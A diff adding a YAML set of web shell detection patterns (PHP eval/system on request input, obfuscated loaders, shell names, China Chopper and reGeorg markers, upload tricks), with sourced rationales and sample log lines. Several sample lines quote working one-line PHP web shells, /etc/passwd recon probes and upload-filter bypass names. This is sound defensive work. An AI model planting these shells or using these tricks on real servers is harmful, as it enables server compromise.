@@ -1,0 +1,381 @@
+# Mention patterns for web shells: server-side code that executes request input, obfuscated PHP loaders, known web
+# shell names and antivirus family names, tunnelling shells (reGeorg), the command markers of China Chopper, and
+# upload tricks used to plant shells. Sources are php-malware-finder, SigmaHQ rules, PayloadsAllTheThings and the
+# reGeorg project, cited per entry.
+#
+# In access logs, web shell names and command parameters are also requested by internet scanners hoping to find an
+# existing shell; such requests are attempts, and the response code and whether the file exists decide them.
+
+- id: mention.webshell.php_eval_request_input
+  title: PHP eval of request input
+  match:
+    anchored: 'eval {0,3}\( {0,3}\$_(?:GET|POST|REQUEST|COOKIE|SERVER)\['
+  case_sensitive: false
+  strength: strong
+  attack: [T1505.003]
+  telemetry: [any]
+  source:
+    name: php-malware-finder, DodgyPhp rule (jvoisin)
+    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
+    license: LGPL-3.0
+    upstream_id: DodgyPhp
+  rationale: >-
+    From the rule's $execution pattern: evaluating a request variable as PHP code is the one-line web shell
+    ('<?php @eval($_POST[x]); ?>', the China Chopper and AntSword server side). Legitimate PHP never evaluates raw
+    request input. Seen in WAF, file-integrity and scanner logs.
+  examples:
+    positive:
+      - 'Nov 20 17:00:00 web01 aide: added /var/www/html/up/1.php content: <?php @eval($_POST[''pass'']);?>'
+    negative:
+      - 'Nov 20 17:00:01 web01 php-fpm[880]: PHP Notice: Undefined index: page in /var/www/html/index.php on line 12 ($_GET[''page''])'
+      - 'Nov 20 17:00:02 web01 php-fpm[880]: eval() disabled by suhosin'
+
+- id: mention.webshell.php_exec_request_input
+  title: PHP command execution of request input
+  match:
+    literal:
+      - 'system($_get['
+      - 'system($_post['
+      - 'system($_request['
+      - 'system($_cookie['
+      - 'passthru($_get['
+      - 'passthru($_post['
+      - 'passthru($_request['
+      - 'shell_exec($_get['
+      - 'shell_exec($_post['
+      - 'shell_exec($_request['
+      - 'assert($_get['
+      - 'assert($_post['
+      - 'assert($_request['
+      - 'popen($_get['
+      - 'popen($_post['
+      - 'popen($_request['
+      - '`$_get['
+      - '`$_post['
+      - '`$_request['
+  case_sensitive: false
+  strength: strong
+  attack: [T1505.003, T1059.004]
+  telemetry: [any]
+  source:
+    name: php-malware-finder, DodgyPhp rule (jvoisin)
+    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
+    license: LGPL-3.0
+    upstream_id: DodgyPhp
+  rationale: >-
+    The no-space forms of the rule's $execution pattern for OS command functions and backticks applied directly to a
+    request variable ('<?php system($_GET[''cmd'']); ?>', also the PayloadsAllTheThings upload payloads). These are
+    command web shells; spaced variants are not covered by the literal forms.
+  examples:
+    positive:
+      - 'Nov 20 17:01:00 web01 modsecurity: Matched "Operator Rx" against ARGS:file: <?php system($_GET[''cmd'']); ?>'
+      - '<?=`$_GET[0]`?>'
+    negative:
+      - 'Nov 20 17:01:01 web01 php-fpm[880]: PHP Warning: system(): Unable to fork [/usr/bin/convert in.png out.jpg]'
+      - 'Nov 20 17:01:02 web01 php-fpm[880]: $page = htmlspecialchars($_GET[''page''])'
+
+- id: mention.webshell.php_eval_decoder
+  title: PHP eval of decoded or decompressed content
+  match:
+    anchored: 'eval {0,3}\( {0,3}(?:base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13) {0,3}\('
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1027.010, T1140]
+  telemetry: [any]
+  source:
+    name: php-malware-finder, DodgyPhp rule (jvoisin)
+    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
+    license: LGPL-3.0
+    upstream_id: DodgyPhp
+  rationale: >-
+    eval(base64_decode(...)), eval(gzinflate(...)) and similar are how PHP backdoors and injected loaders hide their
+    code. Some commercial plugins obfuscate licensing code the same way, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 17:02:00 web01 aide: changed /var/www/html/wp-content/plugins/x/x.php: eval(gzinflate(base64_decode(''7b1rcxs5ki76'')));'
+    negative:
+      - 'Nov 20 17:02:01 web01 php-fpm[880]: $data = base64_decode($payload); json_decode($data);'
+      - 'Nov 20 17:02:02 web01 php-fpm[880]: evaluation of template cache complete'
+
+- id: mention.webshell.php_split_eval
+  title: PHP eval name split by string concatenation
+  match:
+    literal: ['''ev''.''al''']
+  case_sensitive: false
+  strength: strong
+  attack: [T1505.003, T1027]
+  telemetry: [any]
+  source:
+    name: php-malware-finder, ObfuscatedPhp rule (jvoisin)
+    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
+    license: LGPL-3.0
+    upstream_id: ObfuscatedPhp
+  rationale: >-
+    Building the word eval from pieces ('ev'.'al') exists only to dodge scanners; the rule ties it to the b374k
+    shell. Legitimate code calls eval directly or not at all.
+  examples:
+    positive:
+      - '$f = ''ev''.''al''; $f($_POST[''c'']);'
+    negative:
+      - '$name = ''eval''.''uation''; echo $name;'
+      - 'Nov 20 17:03:00 web01 app[700]: evaluation complete'
+
+- id: mention.webshell.base64_php_markers
+  title: Base64 of 'eval(' or 'base64_decode' inside text
+  match:
+    literal: ['ZXZhbCg', 'YmFzZTY0X2RlY29kZ']
+  case_sensitive: true
+  strength: medium
+  attack: [T1505.003, T1027.010]
+  telemetry: [any]
+  source:
+    name: php-malware-finder, b64 rule (jvoisin)
+    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
+    license: LGPL-3.0
+    upstream_id: b64
+  rationale: >-
+    Base64 of 'eval(' and of 'base64_decode', the layered-encoding marker of PHP droppers and of web shell clients
+    (China Chopper, AntSword) that send base64 PHP in POST bodies. Base64 data matches these 7 and 17 characters by
+    chance only rarely; WAF and request-body logs are where they appear.
+  examples:
+    positive:
+      - 'Nov 20 17:04:00 waf01 modsec: ARGS:z0 = ZXZhbCgkX1BPU1RbInoxIl0pOw=='
+    negative:
+      - 'Nov 20 17:04:01 waf01 modsec: ARGS:token = c2Vzc2lvbi1pZA=='
+      - 'Nov 20 17:04:02 web01 app[700]: blob=ZXhhbXBsZS5vcmc='
+
+- id: mention.webshell.php_shell_names
+  title: Classic PHP web shell names
+  match:
+    literal: ['r57shell', 'fx29shell', 'b374k']
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003]
+  telemetry: [any]
+  source:
+    name: php-malware-finder, DodgyStrings and Websites rules (jvoisin)
+    url: https://github.com/jvoisin/php-malware-finder/blob/87b6d7faa4829b1e1c7c8895ef33d2b84d00b11f/data/php.yar
+    license: LGPL-3.0
+    upstream_id: DodgyStrings
+  rationale: >-
+    Names of widely distributed PHP web shells. Inside a file or response it is the shell itself; in an access log it
+    is often an internet scanner probing for an existing copy, so it is medium. The c99shell name is carried by the
+    antivirus-family entry.
+  examples:
+    positive:
+      - '203.0.113.62 - - [20/Nov/2026:17:05:00 +0000] "POST /images/b374k.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:05:01 +0000] "GET /images/banner.png HTTP/1.1" 200 5120 "-" "Mozilla/5.0"'
+      - 'Nov 20 17:05:02 web01 app[700]: r57 cache shard ready'
+
+- id: mention.webshell.antivirus_families
+  title: Antivirus web shell family names
+  match:
+    literal:
+      - 'C99shell'
+      - 'ASPXSpy'
+      - 'PHPShell'
+      - 'PShlSpy'
+      - 'SinoChoper'
+      - 'Aspdoor'
+      - 'Backdoor.PHP'
+      - 'Backdoor.ASP'
+      - 'Backdoor.JSP'
+      - 'Backdoor/PHP'
+      - 'Backdoor/ASP'
+      - 'Backdoor/JSP'
+      - 'Trojan.PHP'
+      - 'Trojan.ASP'
+      - 'Trojan.JSP'
+      - 'IIS/BackDoor'
+      - 'JAVA/Backdoor'
+      - 'Troj/PHP'
+      - 'Troj/ASP'
+      - 'Troj/JSP'
+  case_sensitive: false
+  strength: strong
+  attack: [T1505.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Antivirus - Web Shell Detection Signature (Florian Roth, Arnim Rupp)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/category/antivirus/av_webshell.yml
+    license: DRL-1.1
+    upstream_id: fdf135a2-9241-4f96-a114-bb404948f736
+  rationale: >-
+    Vendor family names for server-side web shells as they appear in antivirus and EDR text logs; a detection on a
+    server is a direct web shell lead, and the rule rates false positives as unlikely. The rule's generic tokens
+    ('Webshell', 'Chopper', 'PHP/', 'ASP/', 'JSP:', 'filebrowser' and similar) are left out because they also occur
+    in ordinary paths and messages; as a result Microsoft-style names such as 'Backdoor:ASP/Chopper' are not
+    matched here.
+  examples:
+    positive:
+      - 'Nov 20 17:06:00 web02 av-agent: Threat detected: Backdoor.ASP.Chopper in C:\inetpub\wwwroot\aspnet_client\x.aspx'
+      - 'Nov 20 17:06:01 web01 savd[700]: Found Troj/PHP-AB in /var/www/html/up/1.php'
+    negative:
+      - 'Nov 20 17:06:02 web01 savd[700]: Scan completed, no threats found in /var/www/html'
+      - 'Nov 20 17:06:03 web02 w3wp: Request to /api/php/handler.asp completed 200'
+
+- id: mention.webshell.antsword_client
+  title: AntSword web shell client
+  match:
+    literal: ['antSword/']
+  case_sensitive: false
+  strength: strong
+  attack: [T1505.003]
+  telemetry: [any]
+  source:
+    name: tennc/webshell collection README (web shell management tools list)
+    url: https://github.com/tennc/webshell/blob/6b17eae4a0bc792f996a38ce32772e4db9c7c799/README.md
+    license: MIT
+    upstream_id: antSword
+  rationale: >-
+    AntSword, a web shell management client listed in the collection, identifies itself as antSword/<version> unless
+    changed; a request carrying it is an operator driving a planted shell.
+  examples:
+    positive:
+      - '203.0.113.63 - - [20/Nov/2026:17:07:00 +0000] "POST /uploads/a.php HTTP/1.1" 200 34 "-" "antSword/v2.1"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:07:01 +0000] "GET /docs/sword-guide HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:17:07:02 +0000] "GET /ant/build.xml HTTP/1.1" 404 0 "-" "Apache-Ant/1.10"'
+
+- id: mention.webshell.chopper_command_markers
+  title: China Chopper command output markers
+  match:
+    literal: ['&ipconfig&echo', '&quser&echo', '&whoami&echo', '&c:&echo', '&cd&echo', '&dir&echo', '&echo [E]', '&echo [S]']
+  case_sensitive: false
+  strength: strong
+  attack: [T1505.003, T1059.003]
+  telemetry: [windows_text]
+  source:
+    name: 'SigmaHQ: Chopper Webshell Process Pattern (Florian Roth, MSTI)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_webshell_chopper.yml
+    license: DRL-1.1
+    upstream_id: fa3c117a-bc0d-416e-a31b-0c0e80653efb
+  rationale: >-
+    China Chopper wraps every command as 'cd /d "path"&<cmd>&echo [S]&cd&echo [E]' so its client can split output;
+    a cmd.exe line with these markers is a Chopper session. The rule ties it to w3wp.exe; as free text the markers
+    alone are distinctive.
+  examples:
+    positive:
+      - 'cmd.exe /c cd /d "c:\inetpub\wwwroot\"&whoami&echo [S]&cd&echo [E]'
+    negative:
+      - 'cmd.exe /c echo backup started & robocopy C:\data D:\data'
+      - 'cmd.exe /c dir C:\inetpub\logs'
+
+- id: mention.webshell.regeorg_banner
+  title: reGeorg tunnel health response
+  match:
+    literal: ['Georg says, ''All seems fine''']
+  case_sensitive: true
+  strength: strong
+  attack: [T1505.003, T1572, T1090.001]
+  telemetry: [any]
+  source:
+    name: reGeorg tunnel.php (SensePost)
+    url: https://github.com/sensepost/reGeorg/blob/1ca54c2a6ab22ded150d04cff8fdb796990b1ced/tunnel.php
+    license: CC-BY-NC-SA-4.0
+    upstream_id: tunnel.php
+  rationale: >-
+    Every reGeorg tunnel script (php, aspx, ashx, jsp) answers a GET with this sentence; a response body, proxy or
+    DLP log containing it shows a SOCKS tunnel planted on a web server.
+  examples:
+    positive:
+      - '10.0.3.40 - - [20/Nov/2026:17:08:00 +0000] "GET /images/tunnel.php HTTP/1.1" 200 33 body="Georg says, ''All seems fine''"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:08:01 +0000] "GET /health HTTP/1.1" 200 2 body="ok"'
+      - 'Nov 20 17:08:02 web01 app[700]: George says hello'
+
+- id: mention.webshell.regeorg_commands
+  title: reGeorg tunnel command parameters
+  match:
+    literal: ['cmd=connect&target', 'cmd=disconnect', 'cmd=forward']
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1572, T1090.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Webshell ReGeorg Detection Via Web Logs (Cian Heasley)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_webshell_regeorg.yml
+    license: DRL-1.1
+    upstream_id: 2ea44a60-cfda-11ea-87d0-0242ac130003
+  rationale: >-
+    reGeorg clients drive the tunnel with cmd=connect&target=, cmd=forward and cmd=disconnect query strings. The rule
+    also requires POST with no referer or user agent, which cannot be expressed; applications with the same
+    parameter names exist, so it is medium. The rule's generic 'cmd=read' is left out.
+  examples:
+    positive:
+      - '203.0.113.64 - - [20/Nov/2026:17:09:00 +0000] "POST /images/tunnel.aspx?cmd=connect&target=10.0.0.10&port=3389 HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:09:01 +0000] "GET /api?cmd=status HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:17:09:02 +0000] "GET /mail?cmd=compose HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.webshell.cmd_parameter_recon
+  title: OS reconnaissance command in a cmd= parameter
+  match:
+    anchored: 'cmd=(?:whoami|id\b|uname(?:%20|\+| )-a|ipconfig|ifconfig|hostname|cat(?:%20|\+| )/etc/passwd|net(?:%20|\+| )user|pwd\b|ls(?:%20|\+| )-la)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1033, T1082]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Linux Webshell Indicators (Florian Roth, Nasreddine Bencherchali)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/linux/process_creation/proc_creation_lnx_webshell_detection.yml
+    license: DRL-1.1
+    upstream_id: 818f7b24-0fba-4c49-a073-8b755573b9c7
+  rationale: >-
+    The rule lists the recon commands (whoami, id, uname, ifconfig, hostname, cat, pwd) web shells run as children of
+    the web server; this entry catches them on the request side, passed in a cmd parameter. Internet scanners send
+    the same probes to guessed shell paths, so it is medium; a 200 response from an unexpected script decides.
+  examples:
+    positive:
+      - '203.0.113.65 - - [20/Nov/2026:17:10:00 +0000] "GET /uploads/x.php?cmd=whoami HTTP/1.1" 200 9 "-" "curl/8.0"'
+      - '203.0.113.65 - - [20/Nov/2026:17:10:01 +0000] "GET /uploads/x.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1802 "-" "curl/8.0"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:10:02 +0000] "GET /api?cmd=identify HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:17:10:03 +0000] "GET /portal?cmd=list&page=2 HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.webshell.php_double_extension
+  title: Upload name with a PHP extension before an image extension
+  match:
+    anchored: '\.php[0-9s]?\.(?:jpe?g|png|gif|bmp)\b'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1036.008]
+  telemetry: [any]
+  source:
+    name: PayloadsAllTheThings, Upload Insecure Files
+    url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/08ea40e77db3f42ef8f20c65196f3936a19b6c86/Upload%20Insecure%20Files/README.md
+    license: MIT
+    upstream_id: Upload Insecure Files
+  rationale: >-
+    'shell.php.jpg' (reverse double extension) passes image-only upload filters but executes as PHP on misconfigured
+    Apache. Users rarely name images this way, so it is medium; whether the file was requested afterwards decides.
+  examples:
+    positive:
+      - '203.0.113.66 - - [20/Nov/2026:17:11:00 +0000] "POST /profile/avatar HTTP/1.1" 200 12 "-" "-" filename="shell.php.jpg"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:11:01 +0000] "GET /img/photo.jpg HTTP/1.1" 200 81234 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:17:11:02 +0000] "GET /docs/php.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
+- id: mention.webshell.rtlo_filename
+  title: Right-to-left override in a requested or uploaded name
+  match:
+    literal: ['%E2%80%AE']
+  case_sensitive: false
+  strength: medium
+  attack: [T1036.002, T1505.003]
+  telemetry: [any]
+  source:
+    name: PayloadsAllTheThings, Upload Insecure Files
+    url: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/08ea40e77db3f42ef8f20c65196f3936a19b6c86/Upload%20Insecure%20Files/README.md
+    license: MIT
+    upstream_id: Upload Insecure Files
+  rationale: >-
+    The URL-encoded right-to-left override character makes 'name.%E2%80%AEphp.jpg' display as an image name while the
+    real extension is different. Bidirectional text in URLs is rare outside this trick, so it is medium.
+  examples:
+    positive:
+      - '203.0.113.67 - - [20/Nov/2026:17:12:00 +0000] "POST /upload HTTP/1.1" 200 12 "-" "-" filename="name.%E2%80%AEphp.jpg"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:17:12:01 +0000] "GET /search?q=%E2%80%9Cquoted%E2%80%9D HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:17:12:02 +0000] "GET /files/report%20final.pdf HTTP/1.1" 200 81234 "-" "Mozilla/5.0"'
